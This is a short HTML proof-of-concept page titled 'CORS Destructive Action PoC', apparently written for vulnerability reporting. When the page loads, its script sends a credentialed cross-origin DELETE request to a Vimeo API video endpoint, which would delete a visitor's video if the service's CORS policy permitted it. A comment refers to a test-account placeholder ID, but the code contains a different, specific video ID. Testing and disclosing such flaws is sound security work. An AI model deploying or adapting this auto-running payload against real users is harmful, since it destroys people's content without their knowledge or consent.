<!DOCTYPE html>
<html>
<body>
<h1>CORS Destructive Action PoC</h1>
<script>
(async () => {
  try {
    // Replace 123456 with a real video ID from your test account
    const resp = await fetch("https://api.vimeo.com/videos/1109902013", {
      method: "DELETE",
      credentials: "include"
    });

    alert("DELETE request sent! Status: " + resp.status);
  } catch (e) {
    alert("Error: " + e);
  }
})();
</script>
</body>
</html>
